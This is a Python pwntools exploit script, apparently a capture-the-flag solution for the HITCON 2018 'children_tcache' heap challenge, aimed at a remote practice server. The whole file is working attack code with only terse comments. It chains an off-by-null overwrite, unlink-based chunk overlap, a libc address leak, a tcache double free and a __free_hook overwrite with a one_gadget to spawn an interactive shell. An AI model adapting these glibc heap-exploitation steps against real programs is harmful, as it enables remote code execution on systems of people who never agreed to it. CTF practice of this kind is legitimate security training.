from pwn import *

#context.log_level = 'debug'

#p = process('./HITCON_2018_children_tcache')
p = remote('node4.buuoj.cn', 28207)
libc = ELF('libc-2.27.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(size, content):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'Size:', str(size).encode())
    p.sendafter(b'Data:', content)

def show(index):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'Index:', str(index).encode())

def delete(index):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'Index:', str(index).encode())

#off by null
alloc(0x450, b'a') #0
alloc(0xa8, b'a')  #1
alloc(0x4f0, b'a') #2
alloc(0x60, b'a')  #3 avoid merge to top chunk

delete(0)
delete(1)
#overwrite chunk2's size to 0x500
for i in range(8):
    alloc(0xa8 - i, b'a' * (0xa8 - i)) #0
    delete(0)

#overwrite chunk2's prevSize to 0x510
alloc(0xa8, b'a' * 0xa0 + b'\x10\x05') #0

#unlink to merge chunk0
delete(2)

#alloc chunk0, then chunk1's fd will be replaced to main_arena
alloc(0x450, b'a') #1
show(0)

one_gadgets = [0x4f3c2, 0x4f365, 0x10a45c]
one_gadgets_buu = [0x4f2c5, 0x4f322, 0x10a38c]

libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
one = libc_base + one_gadgets_buu[1]
success('libc_base -> {}'.format(hex(libc_base)))

#now, we could alloc chunk1 again
alloc(0xa8, b'a') #2

#double free
delete(0)
delete(2)

alloc(0xa0, p64(free_hook)) #0
alloc(0xa0, b'a') #2
alloc(0xa0, p64(one)) #4
delete(3)
p.interactive()